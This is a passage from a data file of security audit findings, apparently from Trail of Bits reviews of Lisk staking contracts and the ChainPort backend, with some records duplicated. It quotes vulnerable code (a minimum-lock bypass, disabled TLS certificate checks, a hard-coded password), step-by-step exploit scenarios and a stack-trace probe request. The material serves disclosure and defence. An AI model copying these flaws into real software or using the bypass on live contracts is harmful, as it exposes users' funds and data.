transfer from Staking contract to DAO failed\"); } else { // send penalty amount to the creator bool success = IERC20(l2LiskTokenContract).transfer(lock.creator, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to creator failed\"); } return penalty; } Figure 1.1: The initiateFastUnlock function in L2Staking.sol#L285312 function calculatePenalty(uint256 amount, uint256 remainingDuration) internal view virtual returns (uint256) { if (emergencyExitEnabled) { return 0; } return (amount * remainingDuration) / (MAX_LOCKING_DURATION * PENALTY_DENOMINATOR); } Figure 1.2: The calculatePenalty function in L2Staking.sol#L142148 However, users that have initiated a fast unlock are still able to add to their positions locked amount through the increaseLockingAmount function, since this function veries only that the position is not expired (gure 1.3). function increaseLockingAmount(uint256 lockId, uint256 amountIncrease) public virtual { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(amountIncrease > 0, \"L2Staking: increased amount should be greater than zero\"); require( lock.pausedLockingDuration > 0 || lock.expDate > todayDay(), \"L2Staking: can not increase amount for expired locking position\" ); [...] } Figure 1.3: The increaseLockingAmount function in L2Staking.sol#L317338 Users could exploit this validation issue to bypass the minimum 14-day lock duration. Specically, a user could deposit a very small amount and then initiate a fast unlock of the position, reducing the positions lock duration to three days for a negligible penalty. The user could then call increaseLockingAmount to deposit the larger amount of funds they intended to deposit, leaving with a lock duration of only three days for very little cost. Exploit Scenario Alice wants to deposit 100,000 LSK tokens in order to gain a large amount of voting power; however, she does not want to have to lock her position for 14 days. She takes the following actions to reduce her lock duration: 1. Deposits the minimum amount of LSK tokens (0.01 LSK) for the minimum duration (14 days) 2. Initiates a fast unlock of her position and pays a small penalty (0.0028 LSK) to reduce the positions lock duration to three days 3. Deposits 100,000 LSK to her position Her position is now locked for three days instead of the minimum 14 days, and she has paid a negligible penalty for this benet. Recommendations Short term, add a check to the increaseLockingAmount function that ensures positions that have a lock duration of less than the minimum cannot be increased. Long term, dene a list of function- and system-level invariants and use advanced testing techniques such as smart contract fuzzing with Echidna, Medusa, or Foundry invariant testing to verify that the invariants hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. Removing L2Reward from allowedCreators will freeze all positions created through the contract ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "If the L2Reward contract is removed from the L2Staking contracts allowedCreators mapping, all positions that were created through L2Reward will be frozen until it is re-added. The owner of the L2Staking contract is able to add and remove addresses from the allowedCreators mapping at any time (gure 2.1). This feature enables users to create their positions through an external contract (i.e., the L2Reward contract) and prevents them from modifying their positions by directly calling the L2Staking contract. This is done to ensure that the internal accounting of the L2Reward contract is always correct and in sync with the L2Staking contracts internal state. function addCreator(address newCreator) public virtual onlyOwner { require(newCreator != address(0), \"L2Staking: creator address can not be zero\"); require(newCreator != address(this), \"L2Staking: Staking contract can not be added as a creator\"); allowedCreators[newCreator] = true; emit AllowedCreatorAdded(newCreator); } function removeCreator(address creator) public virtual onlyOwner { require(creator != address(0), \"L2Staking: creator address can not be zero\"); delete allowedCreators[creator]; emit AllowedCreatorRemoved(creator); } Figure 2.1: The addCreator and removeCreator functions in L2Staking.sol#L192206 All functions in the L2Staking contract use the canLockingPositionBeModified internal function as an access control mechanism. If a position was created through an external contract that is in the allowedCreators mapping, the position can be modied only by that contract. Further access controls are implemented in the L2Reward contract to ensure that only the owner of a position can modify it through the contract. function canLockingPositionBeModified( uint256 lockId, IL2LockingPosition.LockingPosition memory lock ) { internal view virtual returns (bool) address ownerOfLock = (IL2LockingPosition(lockingPositionContract)).ownerOf(lockId); bool condition1 = allowedCreators[msg.sender] && lock.creator == msg.sender; bool condition2 = ownerOfLock == msg.sender && lock.creator == address(this); if (condition1 || condition2) { return true; } return false; } Figure 2.2: The canLockingPositionBeModified function in L2Staking.sol#L119136 However, this feature also gives the contract owner the power to freeze all positions created through the L2Reward contract by simply removing the L2Reward contract address from the allowedCreators mapping. This issue applies to any address added to the allowedCreators mapping in the future. Exploit Scenario Alice creates a locked position by depositing 1 million LSK tokens through the L2Reward contract. The owner of the L2Staking contract removes the L2Reward contract from the allowedCreators mapping, preventing Alice and all other users who have created positions through L2Reward from modifying their positions and accessing their tokens. Recommendations Short term, implement an emergency withdrawal function that can be used only in the event that the L2Reward contract is removed from the allowedCreators mapping. Long term, create user-facing documentation outlining the powers of privileges of actors and all risks associated with interacting with the contracts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Missing certicate validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "The client-side verication of the server certicate is disabled in the DB class, allowing for server impersonation and person-in-the-middle attacks when the DB_SSLMODE environment variable is set to true (gure 3.1). 20 21 22 23 24 25 26 27 process.env.DB_SSLMODE === 'true' ? { ssl: { }, require: true, rejectUnauthorized: false, } : {}, Figure 3.1: The setup of TLS in the DB classs constructor (lisk-token-claim/packages/claim-backend/src/db.ts#2027) Exploit Scenario An attacker poses as the PostgreSQL server and presents a fake certicate. Because verication of the server certicate is disabled, the attackers certicate is accepted, allowing him to interfere with communication. Recommendations Short term, re-enable TLS certicate verication in the DB class constructor. Review the TLS conguration to ensure it uses modern TLS protocol versions and ciphers. Long term, incorporate the Semgrep tool with the bypass-tls-verification rule in the CI/CD process to catch issues like this early on.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Synchronous function calls inside asynchronous functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "In multiple locations in the tree-builder component, synchronous functions are called inside asynchronous functions; for example, the synchronous fs.writeFileSync function is called inside the asynchronous createKeyPairs function (gure 4.1). Such calls will block the event loop and essentially defeat the purpose of asynchronicity. Since the event loop is single-threaded, blocking it will prevent all other asynchronous tasks from running concurrently. If an attacker can cause large les to be written, other users could be prevented from taking actions in the system, causing a denial of service. 7 export async function createKeyPairs(amount = 100) { // (...) 21 fs.writeFileSync('../../data/example/key-pairs.json', JSON.stringify(keys), 'utf-8'); 22 } Figure 4.1: A call to the fs.writeFileSync function inside of the async createKeyPairs function (lisk-token-claim/packages/tree-builder/src/applications/example/create_k ey_pairs.ts#722) Synchronous functions are called inside asynchronous functions in these other locations as well:  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L14-L14  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L29-L29  tree-builder/src/applications/generate-airdrop-merkle-tree/build_ airdrop_tree_json.ts#L48-L48  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L14-L14  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L25-L25  tree-builder/src/applications/generate-merkle-tree/build_tree_jso n.ts#L43-L43  tree-builder/src/commands/example/index.ts#L42-L42  tree-builder/src/commands/generate-airdrop-merkle-tree/index.ts#L 103-L103  tree-builder/src/commands/generate-airdrop-merkle-tree/index.ts#L 70-L70  tree-builder/src/commands/generate-merkle-tree/index.ts#L52-L52  tree-builder/src/commands/generate-merkle-tree/index.ts#L82-L82  tree-builder/src/commands/generate-merkle-tree/index.ts#L85-L85 Recommendations Short term, replace all calls to synchronous functions inside asynchronous functions with their asynchronous equivalents. Long term, use the Semgrep tool with the custom Semgrep rule provided in appendix F in the CI/CD process to nd any other instances of this issue.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Hard-coded credentials ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "The claim-backend component sets the PostgreSQL password as an environment variable (gure 5.1). The password is also checked into the source code (gure 5.2). Keeping secrets in environment variables is a well-known antipattern. Environment variables are commonly captured by all manner of debugging and logging information, can be accessed from procfs, and are passed down to all child processes. If attackers have access to the application source code, they would have access to the database password. Additionally, because the password is checked into the source code repository, all employees and contractors with access to the repository have access to the password. Credentials should never be stored in plaintext in source code repositories, as they can become valuable tools to attackers if the repositories are compromised. services: postgres: // (...) image: postgres environment: POSTGRES_USER: claim-backend POSTGRES_PASSWORD: passwd Figure 5.1: The PostgreSQL password set as an environment variable (lisk-token-claim/packages/claim-backend/docker-compose.yml#211) constructor() { this.models = [Signature]; this.sequelize = new Sequelize({ dialect: 'postgres', host: process.env.DB_HOST || '127.0.0.1', database: process.env.DB_DATABASE || 'claim-backend', username: process.env.DB_USERNAME || 'claim-backend', password: process.env.DB_PASSWORD || 'passwd', Figure 5.2: The database password is taken from the DB_PASSWORD environment variable or set to passwd if there is no environment variable. (lisk-token-claim/packages/claim-backend/src/db.ts#815) Exploit Scenario An attacker obtains a copy of the source code from a former employee. He extracts the PostgreSQL password and uses it to exploit Lisks products. Recommendations Short term, use a Docker secret in place of the environment variable for the PostgreSQL password, and remove the password from the source code; use Docker secrets instead of environment variables to pass any other sensitive information into containers moving forward. Long term, consider storing credentials in a secret management solution. Also, periodically use the TrueHog tool to detect secrets checked into the source code. References  GitHub Docs: Removing sensitive data from a repository", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "6. Use of outdated libraries ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "We used npm audit to detect the use of outdated dependencies in the lisk-token-claim component, which identied the following vulnerable packages. Dependency Vulnerability Report Vulnerability", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Stack traces in Express are not disabled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "The NODE_ENV environment variable is not set to production in the claim-backend component. As a result, the underlying Express web framework returns errors to the client along with a stack trace (gure 7.1), which exposes internal claim-backend paths and functions. (Express does not return stack traces in the production environment.) POST /rpc HTTP/1.1 Host: 127.0.0.1:3000 Content-Type: application/json Content-Length: 161 { } \"jsonrpc\": \"2.0\", \"method\": \"checkEligibility\", \"params\": { \"lskAddress\": \"lskfcu7z7sch46o67sq24v9h9df2h5o2juvjp3fjj\" }, \"id\": 1 HTTP/1.1 400 Bad Request // (...) <pre>SyntaxError: Unexpected token &#39; in JSON at position 160<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/node_modules/body-parser/lib/types/json.js:92:19)<br> &nbsp; &nbsp;at /node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/node_modules/raw-body/index.js:238:16)<br> &nbsp; &nbsp;at done (/node_modules/raw-body/index.js:227:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/node_modules/raw-body/index.js:287:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:517:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1400:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre> </body></html> Figure 7.1: An HTTP request that results in the Exploit Scenario An attacker uses the stack traces returned with errors from the Express web framework to identify internal paths and functions in the claim-backend component. This information allows him to prepare further exploits that target the claim-backend component. Recommendations Short term, set the NODE_ENV variable to production and check that stack traces are not returned (for example, when a request with intentionally malformed JSON in the body is sent to RPC). References  Express: Error Handling", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Docker Compose ports exposed on all interfaces ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "Docker ports are specied in the docker-compose.yml conguration le without a host. For example, ${DB_PORT}:5432 is specied for the PostgreSQL container (gure 8.1). This means that these ports are accessible not just to other processes running on the same computer, but also to other computers on the same network. 2 3 4 5 6 7 services: postgres: image: postgres restart: always ports: - '${DB_PORT}:5432' Figure 8.1: The PostgreSQL port is exposed on all interfaces. (lisk-token-claim/packages/claim-backend/docker-compose.yml#27) Recommendations Short term, set all conguration values in docker-compose.yml with both hosts and ports. For example, set the PostgreSQL port to ${DB_HOST}:${DB_PORT}:5432 instead of ${DB_PORT}:5432. Long term, use the port-all-interfaces Semgrep rule to detect and ag instances of this conguration pattern. References  Docker Docs: Networking in Compose", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Extending the duration of an expired position can break protocol accounting ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "An incorrect dailyUnlockedAmounts mapping key is used in the _extendDuration function. As a result, extending an expired position can break protocol accounting. The L2Reward contract allows users to extend the duration of their locked positions by passing an array of lock IDs to the extendDuration function, which calls the internal _extendDuration function for each lock ID. This function updates dierent global accounting values depending on whether the given position has expired (gure 9.1). function _extendDuration(uint256 lockID, uint256 durationExtension) internal virtual { IL2LockingPosition.LockingPosition memory lockingPosition = IL2LockingPosition(lockingPositionContract).getLockingPosition(lockID); // claim rewards and update staking contract _claimReward(lockID); IL2Staking(stakingContract).extendLockingDuration(lockID, durationExtension); // update globals totalWeight += lockingPosition.amount * durationExtension; if (lockingPosition.pausedLockingDuration == 0) { // locking period has not finished if (lockingPosition.expDate > todayDay()) { dailyUnlockedAmounts[lockingPosition.expDate] -= lockingPosition.amount; } // locking period has expired, re-lock amount else { totalAmountLocked += lockingPosition.amount; pendingUnlockAmount += lockingPosition.amount; totalWeight += lockingPosition.amount * OFFSET; } dailyUnlockedAmounts[lockingPosition.expDate + durationExtension] += lockingPosition.amount; } } Figure 9.1: The _extendDuration function in L2Reward.sol#L394L419 The highlighted line in gure 9.1 shows that the _extendDuration function uses the sum of the previous expiration date of the given position and the value of the durationExtension input variable as the dailyUnlockedAmounts mapping key. However, based on the extendLockingDuration function of the L2Staking contract, it is clear that the key used in _extendDuration is incorrect (gure 9.2). function extendLockingDuration(uint256 lockId, uint256 extendDays) public virtual { [...] if (lock.pausedLockingDuration > 0) { // remaining duration is paused lock.pausedLockingDuration += extendDays; } else { // remaining duration not paused, if expired, assume expDate is today lock.expDate = Math.max(lock.expDate, todayDay()) + extendDays; } [...] } Figure 9.2: The extendLockingDuration function in L2Staking.sol#L354360 If the position has expired and the sum of lockingPosition.expDate and durationExtension is less than or equal to the value of todayDay, the dailyUnlockedAmounts mapping will use a key that was already used to update the global state in the past. As a result, the values of the global state variables pendingUnlockAmount, totalAmountLocked, totalWeight, and cappedRewards will be incorrect. This can have the following consequences:  The dailyRewards limit could be incorrectly applied.  User rewards could be reduced if the totalWeight value is larger than it should be.  The updateGlobalState function could revert, freezing all user positions and assets. Exploit Scenario Alice deposits 10e18 LSK tokens, creating a position with a lock duration of 14 days. On day 16, she decides to extend her position by one day. Although her position is extended until day 17, the dailyUnlockedAmounts value is updated for day 15, causing the pendingUnlockAmount, totalAmountLocked, and totalWeight accounting values to be incorrect. Recommendations Short term, x the highlighted line of gure 9.1 by adding the line lockingPosition.expDate = Math.max(lockingPosition.expDate,todayDay()) to the else branch, above the highlighted line. Long term, improve the testing suite by adding unit and fuzz tests that verify that the values of the global state variables are correct. 10. Insu\u0000cient event generation Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-LSK2-10 Target: src/L2/L2Reward.sol, src/L2/L2Staking.sol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "11. Users are charged a larger penalty for fast unlocks than necessary ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "The penalty calculation in the fast unlocking mechanism is incorrect and will charge users a higher penalty than what they truly owe. As shown in gure 11.1, the initiateFastUnlock function in the L2Staking contract allows users to reduce the lock duration of their positions to three days. Users incur a penalty for this action proportional to their locked amount and the remaining lock duration. function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { ... // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; ... } Figure 11.1: The initiateFastUnlock function in L2Staking.sol#L293296 However, the associated penalty calculation computes the penalty based on the remaining days of the lock duration from when the user initiates the fast unlock request, including the three-day period during which the position will still be locked. Recommendations Short term, replace the penalty calculation logic with the following: uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock) - FAST_UNLOCK_DURATION); Long term, perform a thorough review of the code to identify any potential logical calculation errors in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Users can bypass the minimum lock duration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "Users can bypass the 14-day minimum lock duration by depositing a small amount of LSK tokens, initiating a fast unlock of their positions, and then depositing more tokens. The L2Staking contract allows users to initiate a fast unlock of their positions in order to be able to withdraw their locked LSK tokens early (gure 1.1). This action charges a penalty to the user proportional to their locked amount and the remaining lock duration, and sets the positions lock duration to three days (gure 1.2). function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(remainingLockingDuration(lock) > FAST_UNLOCK_DURATION, \"L2Staking: less than 3 days until unlock\"); // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; // update locking position (IL2LockingPosition(lockingPositionContract)).modifyLockingPosition(lockId, amount, expDate, 0); if (lock.creator == address(this)) { // send penalty amount to the Lisk DAO Treasury contract bool success = IERC20(l2LiskTokenContract).transfer(daoTreasury, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to DAO failed\"); } else { // send penalty amount to the creator bool success = IERC20(l2LiskTokenContract).transfer(lock.creator, penalty); require(success, \"L2Staking: LSK token transfer from Staking contract to creator failed\"); } return penalty; } Figure 1.1: The initiateFastUnlock function in L2Staking.sol#L285312 function calculatePenalty(uint256 amount, uint256 remainingDuration) internal view virtual returns (uint256) { if (emergencyExitEnabled) { return 0; } return (amount * remainingDuration) / (MAX_LOCKING_DURATION * PENALTY_DENOMINATOR); } Figure 1.2: The calculatePenalty function in L2Staking.sol#L142148 However, users that have initiated a fast unlock are still able to add to their positions locked amount through the increaseLockingAmount function, since this function veries only that the position is not expired (gure 1.3). function increaseLockingAmount(uint256 lockId, uint256 amountIncrease) public virtual { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(amountIncrease > 0, \"L2Staking: increased amount should be greater than zero\"); require( lock.pausedLockingDuration > 0 || lock.expDate > todayDay(), \"L2Staking: can not increase amount for expired locking position\" ); [...] } Figure 1.3: The increaseLockingAmount function in L2Staking.sol#L317338 Users could exploit this validation issue to bypass the minimum 14-day lock duration. Specically, a user could deposit a very small amount and then initiate a fast unlock of the position, reducing the positions lock duration to three days for a negligible penalty. The user could then call increaseLockingAmount to deposit the larger amount of funds they intended to deposit, leaving with a lock duration of only three days for very little cost. Exploit Scenario Alice wants to deposit 100,000 LSK tokens in order to gain a large amount of voting power; however, she does not want to have to lock her position for 14 days. She takes the following actions to reduce her lock duration:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Extending the duration of an expired position can break protocol accounting ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "An incorrect dailyUnlockedAmounts mapping key is used in the _extendDuration function. As a result, extending an expired position can break protocol accounting. The L2Reward contract allows users to extend the duration of their locked positions by passing an array of lock IDs to the extendDuration function, which calls the internal _extendDuration function for each lock ID. This function updates dierent global accounting values depending on whether the given position has expired (gure 9.1). function _extendDuration(uint256 lockID, uint256 durationExtension) internal virtual { IL2LockingPosition.LockingPosition memory lockingPosition = IL2LockingPosition(lockingPositionContract).getLockingPosition(lockID); // claim rewards and update staking contract _claimReward(lockID); IL2Staking(stakingContract).extendLockingDuration(lockID, durationExtension); // update globals totalWeight += lockingPosition.amount * durationExtension; if (lockingPosition.pausedLockingDuration == 0) { // locking period has not finished if (lockingPosition.expDate > todayDay()) { dailyUnlockedAmounts[lockingPosition.expDate] -= lockingPosition.amount; } // locking period has expired, re-lock amount else { totalAmountLocked += lockingPosition.amount; pendingUnlockAmount += lockingPosition.amount; totalWeight += lockingPosition.amount * OFFSET; } dailyUnlockedAmounts[lockingPosition.expDate + durationExtension] += lockingPosition.amount; } } Figure 9.1: The _extendDuration function in L2Reward.sol#L394L419 The highlighted line in gure 9.1 shows that the _extendDuration function uses the sum of the previous expiration date of the given position and the value of the durationExtension input variable as the dailyUnlockedAmounts mapping key. However, based on the extendLockingDuration function of the L2Staking contract, it is clear that the key used in _extendDuration is incorrect (gure 9.2). function extendLockingDuration(uint256 lockId, uint256 extendDays) public virtual { [...] if (lock.pausedLockingDuration > 0) { // remaining duration is paused lock.pausedLockingDuration += extendDays; } else { // remaining duration not paused, if expired, assume expDate is today lock.expDate = Math.max(lock.expDate, todayDay()) + extendDays; } [...] } Figure 9.2: The extendLockingDuration function in L2Staking.sol#L354360 If the position has expired and the sum of lockingPosition.expDate and durationExtension is less than or equal to the value of todayDay, the dailyUnlockedAmounts mapping will use a key that was already used to update the global state in the past. As a result, the values of the global state variables pendingUnlockAmount, totalAmountLocked, totalWeight, and cappedRewards will be incorrect. This can have the following consequences:  The dailyRewards limit could be incorrectly applied.  User rewards could be reduced if the totalWeight value is larger than it should be.  The updateGlobalState function could revert, freezing all user positions and assets. Exploit Scenario Alice deposits 10e18 LSK tokens, creating a position with a lock duration of 14 days. On day 16, she decides to extend her position by one day. Although her position is extended until day 17, the dailyUnlockedAmounts value is updated for day 15, causing the pendingUnlockAmount, totalAmountLocked, and totalWeight accounting values to be incorrect. Recommendations Short term, x the highlighted line of gure 9.1 by adding the line lockingPosition.expDate = Math.max(lockingPosition.expDate,todayDay()) to the else branch, above the highlighted line. Long term, improve the testing suite by adding unit and fuzz tests that verify that the values of the global state variables are correct.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "10. Insu\u0000cient event generation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "Multiple user operations do not emit events. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. The following operations should trigger events:  L2Reward:  createPosition  deletePosition  initiateFastUnlock  increaseLockingAmount  extendDuration  pauseLocking  resumeLockingCountdown  L2Staking:  lockAmount  unlock  initiateFastUnlock  increaseLockingAmount  extendLockingDuration  pauseRemainingLockingDuration  resumeCountdown Exploit Scenario An attacker discovers a vulnerability in the L2Reward contract and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "12. Potential for huge gas consumption in updateGlobalState and calculateRewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "Under certain conditions, the updateGlobalState and calculateRewards functions in the L2Reward contract can consume a substantial amount of gas. First, the calculateRewards function calculates a users rewards by looping over the period between the day the user created the position and the day the user claims their rewards (gure 12.1). The larger this period is, the more gas is consumed. If this period is suciently large, the loop could cause an out-of-gas exception. function calculateRewards(uint256 lockID) public view virtual returns (uint256) { ... for (uint256 d = lastClaimDate[lockID]; d < lastRewardDay; d++) { reward += (weight * dailyRewards[d]) / totalWeights[d]; if (lockingPosition.pausedLockingDuration == 0) { // unlocking period is active, weight is decreasing weight -= lockingPosition.amount; } } return reward; } Figure 12.1: The calculateRewards function in L2Reward.sol#L249287 The updateGlobalState function could consume a signicant amount of gas for a similar reason. The loop iteration in this function depends on the period between the date of the last transaction and the current day (gure 12.2). As a result, the greater the duration, the more expensive the loop becomes and the more gas is consumed. As with the calculateRewards function, a suciently long duration could cause an out-of-gas exception. function updateGlobalState() public virtual { uint256 today = todayDay(); uint256 d = lastTrsDate; if (today <= d) return; uint256 cappedRewards; for (; d < today; d++) { totalWeights[d] = totalWeight; cappedRewards = totalAmountLocked / 365; ... } lastTrsDate = today; } Figure 12.2: The updateGlobalState function in L2Reward.sol#L116145 Recommendations Short term, periodically invoke the updateGlobalState function to keep the date of the last transaction updated. This will ensure the period between the last transaction date and the current date never becomes excessively long. Add the gas consumption concerns for the calculateRewards function to the user-facing documentation so that users are aware of the risks. Long term, maintain regular monitoring of the gas usage of these functions to detect instances in which they consume a signicant amount of gas. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Several secrets checked into source control ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The chainport-backend repository contains several secrets that are checked into source control. Secrets that are stored in source control are accessible to anyone who has had access to the repository (e.g., former employees or attackers who have managed to gain access to the repository). We used TrueHog to identify these secrets (by running the command trufflehog git file://. in the root directory of the repository). TrueHog found several types of credentials, including the following, which were veried through TrueHogs credential verication checks:  GitHub personal access tokens  Slack access tokens TrueHog also found unveried GitLab authentication tokens and Polygon API credentials. Furthermore, we found hard-coded credentials, such as database credentials, in the source code, as shown in gure 1.1. [REDACTED] Figure 1.1: chainport-backend/env.prod.json#L3-L4 Exploit Scenario An attacker obtains a copy of the source code from a former DcentraLab employee. The attacker extracts the secrets from it and uses them to exploit DcentraLabs database and insert events in the database that did not occur. Consequently, ChainPorts AWS lambdas process the fake events and allow the attacker to steal funds. Recommendations Short term, remove credentials from source control and rotate them. Run TrueHog by invoking the trufflehog git file://. command; if it identies any unveried credentials, check whether they need to be addressed. Long term, consider using a secret management solution such as Vault to store secrets. 2. Same credentials used for staging, test, and production environment databases Severity: Low Diculty: High Type: Conguration Finding ID: TOB-CHPT-2 Target: Database authentication", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. Use of error-prone pattern for logging functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The pattern shown in gure 3.1 is used repeatedly throughout the codebase to log function names. [REDACTED] Figure 3.1: An example of the pattern used by ChainPort to log function names This pattern is prone to copy-and-paste errors. Developers may copy the code from one function to another but forget to change the function name, as exemplied in gure 3.2. [REDACTED] Figure 3.2: An example of an incorrect use of the pattern used by ChainPort to log function names We wrote a Semgrep rule to detect these problems (appendix D). This rule detected 46 errors associated with this pattern in the back-end application. Figure 3.3 shows an example of one of these ndings. [REDACTED] Figure 3.3: An example of one of the 46 errors resulting from the function-name logging pattern (chainport-backend/modules/web_3/helpers.py#L313-L315) Exploit Scenario A ChainPort developer is auditing the back-end application logs to determine the root cause of a bug. Because an incorrect function name was logged, the developer cannot correctly trace the applications ow and determine the root cause in a timely manner. Recommendations Short term, use the Python decorator in gure 3.4 to log function names. This will eliminate the risk of copy-and-paste errors. [REDACTED] Figure 3.4: A Python decorator that logs function names, eliminating the risk of copy-and-paste errors Long term, review the codebase for other error-prone patterns. If such patterns are found, rewrite the code in a way that eliminates or reduces the risk of errors, and write a Semgrep rule to nd the errors before the code hits production.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Use of hard-coded strings instead of constants ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses several hard-coded strings that could be dened as constants to prevent any typos from introducing vulnerabilities. For example, the checks that determine the systems environment compare the result of the get_env function with the strings develop, staging, prod, or local. Figure 4.1 shows an example of one of these checks. [REDACTED] Figure 4.1: chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L42-L43 We did not nd any typos in these literal strings, so we set the severity of this nding to informational. However, the use of hard-coded strings in place of constants is not best practice; we suggest xing this issue and following other best practices for writing safe code to prevent the introduction of bugs in the future. Exploit Scenario A ChainPort developer creates code that should run only in the development build and safeguards it with the check in gure 4.2. [REDACTED] Figure 4.2: An example of a check against a hard-coded string that could lead to a vulnerability This test always failsthe correct value to test should have been develop. Now, the poorly tested, experimental code that was meant to run only in development mode is deployed in production. Recommendations Short term, create a constant for each of the four possible environments. Then, to check the systems environment, import the corresponding constant and use it in the comparison instead of the hard-coded string. Alternatively, use an enum instead of a string to perform these comparisons. Long term, review the code for other instances of hard-coded strings where constants could be used instead. Create Semgrep rules to ensure that developers never use hard-coded strings where constants are available.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Use of incorrect operator in SQLAlchemy lter ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses the is not operator in an SQLAlchemy querys filter. SQLAlchemy relies on the __eq__ family of methods to apply the lter; however, the is and is not operators do not trigger these methods. Therefore, only the comparison operators (== or 